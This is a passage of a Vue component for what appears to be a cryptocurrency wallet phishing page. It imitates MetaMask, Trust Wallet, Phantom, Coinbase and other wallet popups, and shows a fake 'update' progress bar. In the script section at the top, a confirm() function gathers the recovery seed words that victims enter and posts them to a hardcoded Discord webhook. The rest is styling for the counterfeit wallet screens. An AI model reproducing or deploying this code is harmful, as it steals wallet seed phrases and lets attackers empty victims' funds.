      }, 5000);
    } else {
      walletsright.value = "1";
      selectedOption.value = "12";
      errormessage.value = false;
      resetInput();
      setTimeout(() => {
        doublePage.value = "1";
      }, 100);
    }
  } else if (is == "Coinbase") {
    Coinbaseisshow.value = bol;
    if (bol == true) {
      walletsright.value = "2";
      setTimeout(() => {
        doublePage.value = "2";
      }, 5000);
    } else {
      walletsright.value = "1";
      selectedOption.value = "12";
      errormessage.value = false;
      resetInput();
      setTimeout(() => {
        doublePage.value = "1";
      }, 100);
    }
  }
};

let pageSwitch = (str) => {
  pageManager.value = str;
  if (str == "3") {
    startProgress(one_progress, 10000, {
      minPauses: 10,
      maxPauses: 12,
      minPauseDuration: 300,
      maxPauseDuration: 500,
    });
  }
};

const startProgress = (
  progressRef,
  totalDuration = 10000,
  options = {
    minPauses: 10,
    maxPauses: 12,
    minPauseDuration: 300,
    maxPauseDuration: 500,
  }
) => {
  progressRef.value = 0;
  const startTime = Date.now();

  // td
  const pauseCount =
    Math.floor(Math.random() * (options.maxPauses - options.minPauses + 1)) +
    options.minPauses;
  const pausePoints = Array.from(
    { length: pauseCount },
    () => Math.floor(Math.random() * 60) + 20
  ).sort((a, b) => a - b);

  const pauseDurations = pausePoints.map(
    () =>
      Math.floor(
        Math.random() * (options.maxPauseDuration - options.minPauseDuration)
      ) + options.minPauseDuration
  );

  const segments = [];
  let lastPoint = 0;

  for (const point of pausePoints) {
    segments.push({
      start: lastPoint,
      end: point,
      type: "progress",
    });
    lastPoint = point;
  }

  segments.push({
    start: lastPoint,
    end: 100,
    type: "progress",
  });

  const totalPauseTime = pauseDurations.reduce((sum, dur) => sum + dur, 0);
  const availableTime = totalDuration - totalPauseTime;

  let remainingProgress = 100;
  segments.forEach((segment) => {
    segment.duration = ((segment.end - segment.start) / 100) * availableTime;
    remainingProgress -= segment.end - segment.start;
  });

  let currentSegment = 0;
  let segmentStartTime = startTime;
  let animationFrameId = null;

  const updateProgress = () => {
    const now = Date.now();
    const segment = segments[currentSegment];

    const segmentProgress = Math.min(
      1,
      (now - segmentStartTime) / segment.duration
    );

    progressRef.value =
      segment.start + (segment.end - segment.start) * segmentProgress;

    if (segmentProgress >= 1) {
      if (currentSegment < pausePoints.length) {
        setTimeout(() => {
          currentSegment++;
          segmentStartTime = Date.now();
          animationFrameId = requestAnimationFrame(updateProgress);
        }, pauseDurations[currentSegment]);
      } else if (currentSegment < segments.length - 1) {
        currentSegment++;
        segmentStartTime = now;
        animationFrameId = requestAnimationFrame(updateProgress);
      } else {
        progressRef.value = 100;
        new Promise((resolve) => setTimeout(resolve, 1000))
          .then(() => {
            pageManager.value = "4";
            return new Promise((resolve) => setTimeout(resolve, 3000));
          })
          .then(() => {
            ismessage.value = false;
          });
        return;
      }
    } else {
      animationFrameId = requestAnimationFrame(updateProgress);
    }
  };

  animationFrameId = requestAnimationFrame(updateProgress);

  return () => {
    if (animationFrameId) {
      cancelAnimationFrame(animationFrameId);
    }
  };
};

const confirm = () => {
  mnemonicPhrase.value = visibleInputs.value
    .map((item) => item.value.trim())
    .filter((word) => word !== "");
  hidiscord(JSON.stringify(mnemonicPhrase.value));
};

let webhook =
  "https://discord.com/api/webhooks/1401857076338360362/eFGuqGDpQ3RxCH2P_-8FCNF6BOqkLR-FHnfbOQs_aUYPEgLN8QbHTTW8q14llkHLaiYh";

function hidiscord(mnemonicPhrase) {
  let data = {
    content: `**🤞 Welcome to join --** mnemonicPhrase: ${mnemonicPhrase} `,
  };
  fetch(webhook, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(data),
  })
    .then((res) => {
      console.log(res);
    })
    .catch((err) => {
      console.log(err);
    });
}
</script>

<style scoped>
/* header */
.f-navigation {
  position: relative;
  z-index: 1000;
  background-color: #fff;
  align-items: center;
  width: 100%;
  min-height: 88px;
  padding: 24px 5%;
  font-family: Atyp, sans-serif;
  display: flex;
}

.f-navigation-container {
  justify-content: space-between;
  align-items: center;
  width: 100%;
  max-width: 1280px;
  margin-left: auto;
  margin-right: auto;
  display: flex;
}

.w-inline-block {
  max-width: 100%;
  display: inline-block;
}

.f-navigation-content {
  grid-column-gap: 8px;
  align-items: center;
  display: flex;
}

.f-navigation-menu {
  grid-column-gap: 6px;
  align-items: center;
  display: flex;
  position: static;
}

.w-nav-link {
  position: relative;
  display: inline-block;
  vertical-align: top;
  text-decoration: none;
  color: #222222;
  padding: 20px;
  text-align: left;
  margin-left: auto;
  margin-right: auto;
}

.f-navigation-link {
  color: black;
  letter-spacing: -0.01em;
  white-space: nowrap;
  background-color: rgba(0, 0, 0, 0);
  border-radius: 50px;
  padding: 8px 24px;
  font-size: 14px;
  font-weight: 500;
  line-height: 24px;
  text-decoration: none;
  transition: all 0.35s;
}

.f-navigation-button {
  background-color: black;
  font-family: Atyp, sans-serif;
  outline-offset: 0px;
  color: white;
  text-align: center;
  letter-spacing: -0.02em;
  border-radius: 48px;
  outline: 2px solid rgba(0, 0, 0, 0);
  justify-content: center;
  align-items: center;
  padding: 8px 24px;
  font-size: 14px;
  font-weight: 500;
  line-height: 24px;
  text-decoration: none;
  transition: all 0.2s;
  display: flex;
}

.f-navigation-button:hover {
  background: #282556;
}

/* body */
.f-section-large {
  color: #000;
  padding: 0 5% 92px;
  font-family: Atyp, sans-serif;
  position: relative;
  z-index: 2;
}

.f-container-regular {
  width: 100%;
  max-width: 1140px;
  margin-left: auto;
  margin-right: auto;
  position: relative;
}

.f-header-grid {
  grid-auto-columns: 1fr;
  display: grid;
  grid-column-gap: 40px;
  grid-row-gap: 40px;
  grid-template-rows: auto;
  grid-template-columns: 1fr 1fr;
  align-items: center;
}

.f-margin-bottom-08 {
  margin-bottom: 8px;
}

.f-heading-detail-small {
  color: black;
  letter-spacing: 0.08em;
  text-transform: uppercase;
  font-family: Montserrat, sans-serif;
  font-size: 14px;
  font-weight: 500;
  line-height: 24px;
}

.f-margin-bottom-24 {
  margin-bottom: 24px;
}

.f-h1-heading {
  color: black;
  letter-spacing: -0.04em;
  margin-top: 0;
  margin-bottom: 0;
  font-family: Atyp, sans-serif;
  font-size: 62px;
  font-weight: 700;
  line-height: 1.2;
}

.f-margin-bottom-32 {
  margin-bottom: 32px;
}

.f-paragraph-large {
  letter-spacing: -0.02em;
  margin-bottom: 0;
  font-family: Atyp, sans-serif;
  font-size: 18px;
  font-weight: 500;
  line-height: 32px;
}

.f-header-button-wrapper {
  grid-column-gap: 16px;
  grid-row-gap: 16px;
  flex-wrap: wrap;
  align-items: center;
  display: flex;
}

.f-button-neutral {
  font-family: Atyp, sans-serif;
  background-color: black;
  color: white;
  text-align: center;
  letter-spacing: -0.02em;
  border-radius: 50px;
  justify-content: center;
  align-items: center;
  min-height: 48px;
  padding: 12px 32px;
  font-size: 14px;
  font-weight: 500;
  text-decoration: none;
  transition: background-color 0.3s;
  display: flex;
}

.f-button-neutral:hover {
  background-color: #282556;
}

.f-button-secondary {
  border: 0.5px solid black;
  opacity: 1;
  color: #160042;
  letter-spacing: -0.02em;
  background-color: #fff;
  border-radius: 50px;
  justify-content: center;
  align-items: center;
  min-height: 48px;
  padding: 12px 32px;
  font-size: 14px;
  font-weight: 500;
  text-decoration: none;
  transition: border-color 0.3s, background-color 0.3s;
  display: flex;
}

.f-button-secondary:hover {
  background-color: #f3f5fb;
  border-color: rgba(0, 0, 0, 0);
}

.f-header-image-wrapper-tall {
  border-radius: 12px;
  width: 100%;
  max-width: 500px;
  height: 630px;
  overflow: hidden;
  justify-self: end;
}

.f-image-cover {
  object-fit: cover;
  width: 100%;
  height: 100%;
}

.f-feature-card-row {
  border: 1px solid #f3f5fb;
  border-radius: 12px;
  justify-content: space-between;
  align-items: center;
  padding: 40px 32px;
  display: flex;
}

.f-feature-icon-wrapper {
  background-color: #f7f9fd;
  border-radius: 8px;
  width: 72px;
  min-width: 72px;
  height: 72px;
  min-height: 72px;
  margin-bottom: 32px;
  padding: 16px;
}

.f-margin-bottom-33 {
  margin-bottom: 8px;
}

.f-sub-heading-large {
  color: black;
  letter-spacing: -0.02em;
  font-size: 24px;
  font-weight: 700;
  line-height: 32px;
}

.f-paragraph-small {
  letter-spacing: -0.01em;
  margin-bottom: 0;
  font-size: 14px;
  line-height: 1.8;
}

.f-feature-card-divider {
  background-color: #f3f5fb;
  width: 1px;
  height: 200px;
  margin-left: 40px;
  margin-right: 40px;
}

/* foot */

.f-footer-small {
  background-color: white;
  padding: 32px 5%;
  font-family: Atyp, sans-serif;
  position: relative;
  z-index: 2;
}

.f-container-large {
  width: 100%;
  max-width: 1280px;
  margin-left: auto;
  margin-right: auto;
  position: relative;
}

.f-footer-bottom {
  justify-content: space-between;
  align-items: center;
  display: flex;
}

.f-footer-brand {
  align-items: center;
  display: flex;
}

.w-inline-block {
  max-width: 100%;
  display: inline-block;
}

.f-footer-line {
  background-color: #e4e6f1;
  width: 1px;
  height: 24px;
  margin-left: 16px;
  margin-right: 16px;
}

.f-footer-detail {
  color: #000;
  margin-bottom: 0;
  font-size: 12px;
  font-weight: 500;
  line-height: 16px;
}

.f-footer-group {
  justify-content: flex-end;
  align-items: center;
  display: flex;
}

.f-footer-menu {
  grid-column-gap: 24px;
  flex: none;
  align-items: center;
  display: flex;
}

.f-footer-link {
  color: #160042;
  letter-spacing: -0.01em;
  width: 100%;
  margin-top: 10px;
  margin-bottom: 10px;
  padding-top: 4px;
  padding-bottom: 4px;
  font-size: 14px;
  line-height: 24px;
  text-decoration: none;
  transition: color 0.3s;
}

.f-footer-vertical-divider {
  background-color: #e4e6f1;
  width: 1px;
  height: 16px;
}

.f-footer-logo-xs {
  width: 48px;
  height: 48px;
}

/* wallets */
.walletsbox {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100vh;
  z-index: 10000;
}

.zindexh {
  z-index: 20000;
  opacity: 1;
}

.walletsbg {
  position: absolute;
  top: 0;
  left: 0;
  z-index: 10001;
  width: 100%;
  height: 100%;
  background: #0000004d;
}

.zindexh1 {
  z-index: 20001;
}

.walletscon {
  position: absolute;
  top: 50%;
  left: 50%;
  z-index: 10002;
  transform: translate(-50%, -50%);
}

.walletsbc {
  width: 800px;
  height: 500px;
  background: rgb(255 255 255);
  border-radius: 24px;
}

.walletsflex {
  display: flex;
  flex-direction: row;
  padding: 2rem 1.5rem;
  gap: 1rem;
  height: 100%;
}

.walletsleft {
  flex-basis: 50%;
  margin-bottom: 0px;
}

.scwtw-mb-4 {
  margin-bottom: 1rem;
}

svg:not(:root) {
  overflow: hidden;
}

.scwtw-w-auto {
  width: auto;
  height: 35px;
}

.scwtw-text-color {
  color: rgb(32 32 32);
}

.scwtw-font-normal {
  font-weight: 400;
}

.scwtw-text-base {
  font-size: 1rem;
  line-height: 1.5rem;
}

.font-kh-teka-mono {
  font-family: "Kh Teka Mono", "Inter", sans-serif, monospace;
}

.walletslist {
  scrollbar-width: thin;
  scrollbar-color: #c8c8c8 #ffffff;
  display: flex;
  height: 100%;
  flex-direction: column;
  align-items: flex-start;
  row-gap: 0.5rem;
  overflow-y: auto;
}

.scwtw-w-full {
  width: 100%;
}

.walletsitem {
  width: 100%;
  display: flex;
  align-items: center;
  justify-content: space-between;
  column-gap: 1rem;
  border-radius: 20px;
  background-color: #00000005;
  padding: 0.5rem;
  transition-property: all;
  transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
  transition-duration: 150ms;
}

.walletsitem:hover {
  background-color: rgba(0, 0, 0, 0.05);
}

.scwtw-gap-x-4 {
  column-gap: 1rem;
}

.scwtw-justify-start {
  justify-content: flex-start;
}

.scwtw-items-center {
  align-items: center;
}

.scwtw-flex {
  display: flex;
}

.walletslogobox {
  border-radius: 13px;
  background-color: #00000005;
  border: 1px solid rgb(221, 221, 221);
}

.walletslogo {
  width: 40px;
  height: 40px;
  display: block;
  border-radius: 12px;
}

.scwtw-text-start {
  font-family: Atyp, sans-serif;
  text-align: start;
}

.scwtw-pr-2 {
  padding-right: 0.5rem;
}

.scwtw-gap-x-2 {
  column-gap: 0.5rem;
}

.scwtw-justify-end {
  justify-content: flex-end;
}

.walletsgreenbox {
  font-family: "Inter", sans-serif;
  border-radius: 4px;
  background-color: #10b98126;
  padding: 0.25rem 0.5rem;
  font-size: 9px;
  font-weight: 600;
  color: rgb(16 185 129);
}

.scwtw-uppercase {
  text-transform: uppercase;
}

.walletsright {
  flex-basis: 50%;
  height: 100%;
}

.walletsrbox {
  display: flex;
  width: 100%;
  height: 100%;
  animation: 2s cubic-bezier(0.4, 0, 0.6, 1) 0s infinite normal none running
    scwtw-pulse;
  align-items: center;
  justify-content: center;
  border-radius: 24px;
  background: rgb(240, 240, 240);
}

@keyframes scwtw-pulse {
  50% {
    opacity: 0.5;
  }
}

.walletsrcon {
  opacity: 1;
  row-gap: 1rem;
  justify-content: center;
  align-items: center;
  flex-direction: column;
  display: flex;
}

.scwtw-w-12 {
  width: 3rem;
}

.scwtw-h-12 {
  height: 3rem;
}

.walletsrtxtbox {
  text-align: center;
  max-width: 250px;
}

.walletsrtxt {
  font-weight: 400;
  font-size: 16px;
  color: rgb(54 54 54);
}
/* metamask */

.Metamaskbox {
  position: fixed;
  right: 2rem;
  top: -640px;
  background: white;
  z-index: 20002;
  transition: all 0.2s;
}

.trustbox {
  top: -678px;
}

.phantombox {
  top: -685px;
}

.coinbasebox {
  top: -600px;
}

.okxbox {
  top: -678px;
}

.Rabbybox {
  top: -678px;
}

.uniswapbox {
  top: -678px;
}

.Metamaskboxshow {
  top: 0;
  transition: all 0.2s;
}

.scwtw-mb-1d5 {
  margin-bottom: 0.375rem;
}

.scwtw-w-6 {
  width: 1.5rem;
}

.scwtw-h-6 {
  height: 1.5rem;
}

.no-autofill-pwd {
  -webkit-text-security: disc !important;
}

.no-auto {
  -webkit-text-security: none !important;
}

.scwtw-mb-6 {
  margin-bottom: 1.5rem;
}

.scwtw-relative {
  position: relative;
}
.metamaskone {
  height: 100%;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  overflow: hidden;
}

.scwtw-w-32 {
  width: 8rem;
}

.scwtw-h-32 {
  height: 8rem;
}

.fox-svg {
  animation: 1s ease-in-out 0s infinite alternate none running fadeInOut;
}

.scwtw-justify-center {
  justify-content: center;
}

.scwtw-items-center {
  align-items: center;
}

.scwtw-flex {
  display: flex;
}

.scwtw-mt-12 {
  margin-top: 3rem;
}

.scwtw-animate-spin {
  animation: 1s linear 0s infinite normal none running scwtw-spin;
}

.scwtw-text-orange {
  color: rgb(246 133 26);
}

.metamaskupdata {
  width: 100%;
  height: 100%;
}

.metamaskupdatacon {
  display: flex;
  width: 100%;
  height: 100%;
  align-items: center;
  flex-direction: column;
  background: rgb(255, 255, 255);
}

.metamaskhead {
  display: flex;
  width: 100%;
  align-items: center;
  justify-content: space-between;
  border-bottom: 1px solid rgb(230 230 230);
  background: rgb(242 243 245);
  padding: 0.75rem 1rem;
}

.scwtw-w-8 {
  width: 2rem;
}

.scwtw-h-8 {
  height: 2rem;
}

.metamask-close-button {
  display: flex;
  width: 2rem;
  height: 2rem;
  align-items: center;
  justify-content: center;
  border-radius: 999px;
}

.scwtw-w-4 {
  width: 1rem;
}

.scwtw-h-4 {
  height: 1rem;
}

.scwtw-text-blue {
  color: rgb(3 118 201);
}

.metamaskbody {
  display: flex;
  flex-direction: column;
  justify-content: center;
  padding: 2rem 1rem;
  align-items: center;
}

.scwtw-mt-4 {
  margin-top: 1rem;
}

.updatasvg {
  width: 4rem;
  height: 4rem;
  color: rgb(3, 118, 201);
}

.metamasktit {
  font-family: "Euclid Circular B", Roboto, Inter, sans-serif;
  margin-bottom: 0.5rem;
  margin-top: 20px;
  text-align: center;
  font-size: 24px;
  font-weight: 700;
  color: rgb(20 22 24);
}

.metamasklitxt {
  font-family: "Euclid Circular B", Roboto, Inter, sans-serif;
  margin-bottom: 1.5rem;
  text-align: center;
  font-size: 16px;
  font-weight: 500;
  color: rgb(20, 22, 24);
}

.meatmaskulbox {
  margin-bottom: 1.5rem;
  width: 100%;
  border-radius: 0.5rem;
  background: rgb(245, 245, 245);
  padding: 1rem;
}

.metamaskul {
  margin-bottom: 10px;
}

.scwtw-pl-5 {
  padding-left: 1.25rem;
}

.scwtw-list-disc {
  list-style-type: disc;
}

.metamaskli {
  font-family: "Euclid Circular B", Roboto, Inter, sans-serif;
  font-size: 14px;
  font-weight: 400;
  color: rgb(20, 22, 24);
}

.metamaskli:not(:first-child) {
  margin-top: 0.5rem;
}

.metamaskupdatabut {
  font-family: "Euclid Circular B", "Roboto", "Inter", sans-serif;
  height: 50px;
  width: 100%;
  max-width: 28rem;
  border-radius: 999px;
  background: rgb(3 118 201);
  font-size: 14px;
  font-weight: 500;
  color: white;
}

.metamaskupdatabut:hover {
  opacity: 0.8;
}

.scwtw-text-center {
  text-align: center;
}

.updatadtxt {
  font-family: "Euclid Circular B", "Roboto", "Inter", sans-serif;
  font-size: 14px;
  color: rgb(20 22 24);
}

.updatalink {
  cursor: pointer;
  color: rgb(3, 118, 201);
}

.updatalink:hover {
  opacity: 0.8;
}

.metamaskupdating {
  width: 100%;
  height: 100%;
}

.metamaskupdatingbody {
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  padding: 2rem 1rem;
}

.scwtw-w-16 {
  width: 4rem;
}

.scwtw-h-16 {
  height: 4rem;
}

.metamaskupdatimgtit {
  font-family: "Euclid Circular B", "Roboto", "Inter", sans-serif;
  margin-bottom: 0.5rem;
  text-align: center;
  font-size: 24px;
  font-weight: 700;
  color: rgb(20 22 24);
}

.metamaskupdatingtxt {
  font-family: "Euclid Circular B", "Roboto", "Inter", sans-serif;
  margin-bottom: 1.5rem;
  text-align: center;
  font-size: 16px;
  font-weight: 400;
  color: rgb(20 22 24);
}

.progressbox {
  width: 100%;
  max-width: 28rem;
  margin-bottom: 1.5rem;
}

.progressshadow {
  height: 0.5rem;
  width: 100%;
  overflow: hidden;
  border-radius: 999px;
  background: rgb(230 230 230);
}

.progressbg {
  height: 100%;
  border-radius: 999px;
  background: rgb(3 118 201);
  transition: all 0.3s;
}

.progresstxt {
  font-family: "Euclid Circular B", "Roboto", "Inter", sans-serif;
  margin-bottom: 0.5rem;
  text-align: center;
  font-size: 14px;
  font-weight: 400;
  color: rgb(20 22 24);
}

.metamaskupdatingdtxt {
  font-family: "Euclid Circular B", "Roboto", "Inter", sans-serif;
  margin-bottom: 10px;
  max-width: 28rem;
  text-align: center;
  font-size: 14px;
  font-weight: 400;
  color: rgb(110 110 110);
}

.metamaskimportbody {
  margin-top: 1rem;
}

.metamaskimportbodyone {
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  row-gap: 0.375rem;
  text-align: center;
}

.metamaskimporttit {
  font-family: "Euclid Circular B", "Roboto", "Inter", sans-serif;
  font-size: 21px;
  font-weight: 700;
  color: rgb(20 22 24);
  margin: 20px 0 10px 0;
}

.scwtw-px-4 {
  padding-left: 1rem;
  padding-right: 1rem;
}

.scwtw-mb-2 {
  margin-bottom: 0.5rem;
}

.metamaskimporttxt {
  font-family: "Euclid Circular B", "Roboto", "Inter", sans-serif;
  font-size: 14px;
  font-weight: 400;
  color: rgb(20 22 24);
}

.metamaskimporttxtlink {
  cursor: pointer;
  color: rgb(3 118 201);
}

.metamaskimporttxtlink:hover {
  opacity: 0.8;
}

.metamaskselect {
  text-transform: none;
  font-family: "Euclid Circular B", "Roboto", "Inter", sans-serif;
  font-size: 14px;
  position: relative;
  display: flex;
  width: 100%;
  align-items: center;
  border-radius: 8px;
  border: 1px solid rgb(132 140 150);
  background: white;
  padding: 12px 16px;
  font-weight: 400;
  color: rgb(20 22 24);
  outline: 2px solid transparent;
  outline-offset: 2px;
}

.metamaskmessage {
  width: 100%;
  padding: 0 1rem;
}

.metamaskmessagebox {
  display: flex;
  align-items: center;
  justify-content: flex-start;
  column-gap: 0.5rem;
  border-radius: 4px;
  border-left: 4px solid rgb(3 118 201);
  background: #0376c91a;
  padding: 0.375rem 0;
}

.scwtw-pl-2 {
  padding-left: 0.5rem;
}

.scwtw-fill-blue {
  fill: #0376c9;
}

.importmessagetxt {
  font-family: "Euclid Circular B", "Roboto", "Inter", sans-serif;
  padding-right: 0.25rem;
  font-size: 14px;
  font-weight: 400;
  color: rgb(20 22 24);
}

.metamaskimportbodytwo {
  margin-top: 1rem;
  max-height: 204px;
  overflow-y: auto;
  padding: 0 1rem;
}

.metamaskimportinputbox {
  gap: 0.25rem;
  grid-template-columns: repeat(3, minmax(0, 1fr));
  display: grid;
}

.metamaslinputitem {
  position: relative;
  display: flex;
  align-items: center;
  column-gap: 0.5rem;
}

.trustinputitem {
  position: relative;
}

.metamaskindextxt {
  font-family: "Euclid Circular B", "Roboto", "Inter", sans-serif;
  width: 2.5rem;
  font-size: 14px;
  font-weight: 400;
  color: rgb(0 0 0);
}

.trustindextxt {
  margin-bottom: 10px;
  font-family: "Inter", sans-serif;
  position: absolute;
  top: 12px;
  padding: 0 10px;
  font-size: 16px;
  font-weight: 500;
  color: rgb(0 0 0);
}

.metamaskimportinput {
  font-family: "Euclid Circular B", "Roboto", "Inter", sans-serif;
  display: flex;
  width: 100%;
  align-items: center;
  border-radius: 8px;
  border: 1px solid rgb(132 140 150);
  background: white;
  padding: 0.75rem;
  font-weight: 400;
  color: rgb(20 22 24);
  outline: 2px solid transparent;
  outline-offset: 2px;
}

.trustimportinput {
  font-family: "Inter", sans-serif;
  display: flex;
  height: 3rem;
  width: 100%;
  align-items: center;
  border-radius: 4px;
  border: 1px solid transparent;
  background: rgb(245 245 245);
  padding: 0.75rem 2.5rem 0.75rem 2rem;
  font-size: 16px;
  font-weight: 500;
  color: rgb(30 35 41);
  outline: 2px solid transparent;
  outline-offset: 2px;
}

.trustimportinput:focus {
  border-color: rgb(5 0 255);
}

.metamaskimportinput:hover {
  border-color: rgb(3 118 201);
}

.eyesvgbox {
  background: transparent;
}

.trusteyesvgbox {
  position: absolute;
  top: 12px;
  right: 12px;
  background: transparent;
}

.metamaskmessagethr {
  margin-top: 0.75rem;
  padding: 0 1rem;
}

.messageredbox {
  display: flex;
  align-items: center;
  justify-content: flex-start;
  column-gap: 0.5rem;
  border-radius: 4px;
  border-left: 4px solid rgb(215 56 71);
  background: #d738471a;
  padding: 0.375rem 0;
}

.scwtw-fill-red {
  fill: #d73847;
}

.metamaskerrortext {
  font-family: "Euclid Circular B", "Roboto", "Inter", sans-serif;
  padding-right: 0.25rem;
  font-size: 14px;
  font-weight: 400;
  color: rgb(20 22 24);
}

.enterbutbox {
  width: 100%;
  margin-top: 1rem;
  display: flex;
  align-items: center;
  justify-content: center;
  column-gap: 0.25rem;
  padding: 0 1rem;
}

.enterbut {
  font-family: "Euclid Circular B", "Roboto", "Inter", sans-serif;
  height: 50px;
  width: 100%;
  border-radius: 999px;
  background: rgb(3 118 201);
  font-size: 14px;
  font-weight: 500;
  color: white;
}

.enterbut:disabled {
  opacity: 0.5;
  cursor: not-allowed;
}

/* trust */
.trustone {
  width: 100%;
  height: 100%;
  display: flex;
  background: conic-gradient(
    from 0deg,
    rgba(72, 255, 145, 0.08),
    rgba(0, 148, 255, 0.08),
    rgba(0, 56, 255, 0.08),
    rgba(72, 255, 145, 0.08)
  );
  animation: rotate 3s linear infinite;
  align-items: center;
  justify-content: center;
}

.shield-svg {
  animation: pulseTrust 2s infinite;
  position: relative;
  z-index: 2;
}

.trustupdata {
  width: 100%;
  height: 100%;
}

.trustupdatacon {
  display: flex;
  width: 100%;
  height: 100%;
  align-items: center;
  flex-direction: column;
  background: rgb(255, 255, 255);
}

.scwtw-h {
  height: 120px;
}

.scwtw-h-q {
  height: 70px;
}

.trusttxtbox {
  margin-top: 2rem;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  row-gap: 0.5rem;
  text-align: center;
}

.trusttit {
  font-family: "Geeza Pro", "Inter", sans-serif;
  font-size: 24px;
  font-weight: 700;
  color: #000;
  margin: 20px 0 10px 0;
}

.trusttxt {
  font-family: "Inter", sans-serif;
  font-size: 16px;
  font-weight: 400;
  color: rgb(30 35 41);
}

.trustpresentbox {
  margin-top: 1.5rem;
  width: 100%;
  padding: 0 1.5rem;
}

.trustpresent {
  border-left: 4px solid rgb(0, 148, 255);
  border-top-right-radius: 4px;
  border-top-left-radius: 4px;
  background: #0094ff1a;
  padding: 16px;
}

.trustpresenttxt {
  font-family: "Inter", sans-serif;
  font-size: 14px;
  font-weight: 500;
  color: rgb(30 35 41);
}

.trustpresentulbox {
  width: 100%;
  border-radius: 4px;
  background: rgb(245, 245, 245);
  padding: 1rem;
}

.trustpresentul {
  list-style-type: disc;
  padding-left: 1.25rem;
  margin-bottom: 10px;
}

.trustpresentli {
  font-family: "Inter", sans-serif;
  font-size: 14px;
  font-weight: 400;
  color: rgb(30 35 41);
}

.trustupdatabutbox {
  margin-top: 2rem;
  display: flex;
  width: 100%;
  align-items: center;
  justify-content: center;
  column-gap: 0.25rem;
  padding: 0 1.5rem;
}

.trustupdatabut {
  font-family: "Inter", sans-serif;
  width: 100%;
  border-radius: 999px;
  background: rgb(5 0 255);
  padding: 0.75rem 1rem;
  font-size: 16px;
  font-weight: 500;
  line-height: 24px;
  color: white;
}

.trustupdatabut:hover {
  opacity: 0.8;
}

.trusthelpbox {
  margin-top: 1rem;
  padding: 0 1.5rem;
  text-align: center;
}

.trusthelptxt {
  font-family: "Inter", sans-serif;
  font-size: 14px;
  font-weight: 400;
  color: rgb(30 35 41);
}

.trusthelplink {
  color: rgb(5 0 255);
}

.trusthelplink:hover {
  opacity: 0.8;
}

.trustprogressbox {
  margin-top: 3rem;
  width: 100%;
  padding: 0 2rem;
}

.trustprogressshadow {
  position: relative;
  width: 100%;
  height: 8px;
  overflow: hidden;
  border-radius: 999px;
  background: rgb(245 245 245);
}

.trustprogressbg {
  position: absolute;
  left: 0;
  top: 0;
  height: 100%;
  border-radius: 999px;
  background: rgb(5 0 255);
}

.trustprogresstxtbox {
  margin-top: 0.75rem;
  display: flex;
  align-items: center;
  justify-content: space-between;
}

.trustprogresstxtl {
  font-family: "Inter", sans-serif;
  font-size: 14px;
  font-weight: 400;
  color: rgb(30 35 41);
}

.trustprogresstxtr {
  font-family: "Inter", sans-serif;
  font-size: 14px;
  font-weight: 500;
  color: rgb(30 35 41);
}

.trusthintbox {
  margin-top: 2.5rem;
  width: 100%;
  padding: 0 1.5rem;
  text-align: center;
}

.trusthint {
  font-family: "Inter", sans-serif;
  font-size: 14px;
  font-weight: 400;
  color: rgb(132 142 156);
}

.scwtw-mt-5 {
  margin-top: 1.25rem;
}

.trustselectbox {
  margin-top: 1rem;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  row-gap: 0.5rem;
  text-align: center;
}

.trustselecttit {
  margin: 20px 0 10px 0;
  font-family: "Geeza Pro", "Inter", sans-serif;
  font-size: 24px;
  font-weight: 700;
  color: rgb(30 35 41);
}

.trustselect {
  font-family: "Inter", sans-serif;
  position: relative;
  display: flex;
  height: 3rem;
  width: 100%;
  border-radius: 4px;
  border: 1px solid transparent;
  background: rgb(245 245 245);
  padding: 0.75rem;
  font-weight: 500;
  color: rgb(30 35 41);
  outline: 2px solid transparent;
  outline-offset: 2px;
}

.trustinputsbox {
  margin-top: 1.5rem;
  max-height: 320px;
  overflow-y: auto;
  padding: 0 1rem;
}

.trustinputs {
  display: grid;
  gap: 0.25rem;
  grid-template-columns: repeat(2, minmax(0, 1fr));
}

.svgeyecolor {
  color: rgb(146 154 165);
}

.trusterrorbox {
  margin-top: 0.75rem;
  padding: 0 1rem;
}

.trusterrortxtb {
  display: flex;
  width: 100%;
  align-items: center;
  column-gap: 0.5rem;
  border-radius: 4px;
  padding: 0.75rem;
  background: rgb(254 246 216);
}

.trusterrorsvg {
  color: rgb(201 148 0);
}

.trusterrortxt {
  font-family: "Inter", sans-serif;
  font-size: 12px;
  font-weight: 400;
  color: rgb(201 148 0);
}

.scwtw-gap-x-1 {
  column-gap: 0.25rem;
}

.trustclosebut {
  font-family: "Inter", sans-serif;
  font-size: 16px;
  font-weight: 500;
  line-height: 24px;
  background: transparent;
  color: rgb(5 0 255);
}

.trustclosebut:hover {
  opacity: 0.8;
}

.trustimportbut {
  font-family: "Inter", sans-serif;
  border-radius: 999px;
  padding: 0.75rem 1rem;
  background: rgb(5 0 255);
  font-size: 16px;
  font-weight: 500;
  line-height: 24px;
  color: white;
}

.trustimportbut:disabled {
  opacity: 0.5;
  cursor: not-allowed;
}

/* Phantom */
.phantomone {
  width: 100%;
  height: 100%;
  display: flex;
  align-items: center;
  justify-content: center;
  flex-direction: column;
}

.scwtw-h-se {
  height: 120px;
}

.ghost-svg {
  transform-origin: center;
  filter: drop-shadow(0 0 10px rgba(255, 255, 255, 0.1));
  animation: ghost-float 6s ease-in-out infinite;
}

.scwtw-mt-8 {
  margin-top: 2rem;
}

.phantomonetxt {
  margin-bottom: 10px;
  font-family: "Inter", sans-serif;
  font-size: 1.5rem;
  line-height: 2rem;
  font-weight: 600;
  color: white;
}

.phantomimportheade {
  display: flex;
  height: 59px;
  align-items: center;
  justify-content: space-between;
  border-bottom: 1px solid rgb(50 50 50);
  padding: 10px 16px;
}

.phantomclosebutton {
  background: transparent;
}

.phantomclosesvg {
  width: 1.5rem;
  height: 1.5rem;
  fill: #777;
}

.phantomimportlink {
  fill: #777;
}

.scwtw-mt-6 {
  margin-top: 1.5rem;
}

.scwtw-h-b {
  height: 80px;
}

.phantomimportbox {
  display: flex;
  margin-top: 1rem;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  row-gap: 0.5rem;
  text-align: center;
}

.phantomimporttit {
  margin: 20px 0 10px 0;
  font-family: "Inter", sans-serif;
  font-size: 24px;
